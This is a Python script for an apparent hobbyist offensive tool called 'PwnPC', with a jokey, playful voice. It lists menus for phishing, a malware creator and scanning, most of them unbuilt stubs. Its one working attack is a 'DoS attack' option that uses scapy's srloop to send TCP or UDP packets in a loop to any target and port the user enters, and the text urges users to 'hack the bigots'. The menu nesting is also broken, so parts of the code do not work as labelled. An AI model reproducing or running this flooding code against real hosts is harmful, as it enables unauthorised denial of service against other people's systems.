import requests
from requests.exceptions import RequestException, SSLError, ConnectionError, Timeout
import signal
from colorama import init, Fore, Style
import pyfiglet 
import os
import platform
import time
from scapy.all import *
import socket
import logging
import json
import sys  
import qrcode
from PIL import Image, ImageDraw

def typewriter(type_text, speed=0.05):
    """
    Print the text 
    :param text
    :param speed
    """

    for char in type_text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()
def handle_exit_signal(sig, frame):
    print(Fore.GREEN + Style.BRIGHT + "Haii, u r exiting? Okie, bye bye, don't forget to give a kiss on ur homeboy and hack the bigots :3")
    print(Fore.MAGENTA + Style.BRIGHT + "we will miss ya, and remember, we are femboys/tomboys")
    sys.exit(0)
signal.signal(signal.SIGINT, handle_exit_signal)

platform_type = platform.system()

if platform_type == 'Linux':
    os.system("clear")

if platform_type == 'Windows':
        os.system("cls")

init(autoreset=True)

def lgbtq_flag_ascii(text):
    ascii_art = pyfiglet.figlet_format(text)
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Style.BRIGHT]

    lines = ascii_art.split('\n')

    lgbtq_output = ""
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        lgbtq_output += color + line + '\n'

    return lgbtq_output + Style.RESET_ALL

if __name__ == "__main__":
    text = "PwnPC"
    print(lgbtq_flag_ascii(text))
    print("Haiiii, welcome to the PwnPC LGBTQ+ Multiple tasks OSINT exploitation tool")
    time.sleep(2.0)
    print("So, here are some exploits and tools u can use for exploiting or checking up stuff UwU")
    time.sleep(1.0)
    print(Fore.GREEN + "1) Social Engineering attacks >:3")
    print(Fore.GREEN + "2) Exploitation and vulnerabilities ^w^")
    print(Fore.GREEN + "3) Recon >w<")
    print("We still in building, so wait for more updates ^w^ (Sorry for bad english, I'm brazilian)")
    options = input("Choose a tool number >w<: ")
    if options == "1":
       print(Fore.RED + "Ohhh, u want the LGBTQ social engineering, don't u? Alr, les do dis, fren")
       time.sleep(1.5)
       print(Fore.MAGENTA + Style.BRIGHT + "Welcome to the LGBTQ Social Engineer toolkit, lemme show u the tools")
       print("1) QR Code generator")
       print("2) Phishing campaign >:3")
       print("3) Malware creator >w<")
       options_se = input("Choose a number for those tools: ")
       if options_se == "1":
           qr_link = input("Enter ur URL: ")
           qr_output = input("Put ur filename here: ")

           qr = qrcode.QRCode(
                   version=1,
                   box_size=10,
                   border=4,
                )
           qr.add_data(qr_link)
           qr.make(fit=True)

           img = qr.make_image(fill_color="black", back_color="white")
           img.save(qr_output)
           if qr:
               typewriter("It got saved!")
           else:
                print("Did not got saved")
    elif options == "2":
        typewriter("Wanna exploit, little cutie? Les go, let's hack!")
        time.sleep(1.5)
        print("Here are ur options")
        print("1) DoS attack >:3")
        print("2) Website vulnerability scan")
        print("3) Port scanner (0w0 ;)") 
        options_exploit = input("Enter a exploit number here: ")
        if options_exploit == "1":
            try:
                dos_target = input("Enter ur target here: ")
                dos_packets_type = input("Enter ur packet type here (TCP, UDP): ")
                dos_port = int(input("Enter ur port number: "))
                typewriter("Still in building, will start sending packets soon")
                if dos_packets_type == "TCP":
                    packet_to_send = IP(dst=dos_target)/TCP(dport=dos_port)
                    srloop(packet_to_send)
                elif dos_packets_type == "UDP":
                    packet_to_send = IP(dst=dos_target)/UDP(dport=dos_port)
                    srloop(packet_to_send)
                else:
                    print("Invalid packet type, buddy 3:")
            except Exception as e:
                    print(f"An error occured while sending packets D: : {e}")
        elif options_exploit == "2":
            print("Still in building, buddy :P")
        else:
            print("No option like this")

